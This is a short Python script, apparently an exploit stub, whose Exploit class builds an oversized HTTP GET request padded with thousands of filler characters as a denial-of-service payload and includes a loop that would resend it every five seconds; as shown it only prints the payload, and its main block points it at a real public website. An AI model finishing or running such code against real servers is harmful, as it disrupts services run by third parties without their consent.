#!/usr/bin/env python3
import ssl
import time
import socket
import argparse
import urllib.parse


class Exploit:
    def __init__(self, args):
        self.hostname = urllib.parse.urlparse(args).hostname

    def trigger(self):
        print('[*] Triggering...')
        while 1:
            try:
                self.dos()
            except:
                pass
            time.sleep(5)

    def dos(self):
        payload = "GET /stats/" + "A" * 0x400 + " HTTP/1.1" + \
            "B" * 0x2000 + "\r\nHost: " + self.hostname + "\r\n\r\n"
        print(payload)


if __name__ == '__main__':
    a = Exploit("http://www.baidu.com")
    a.dos()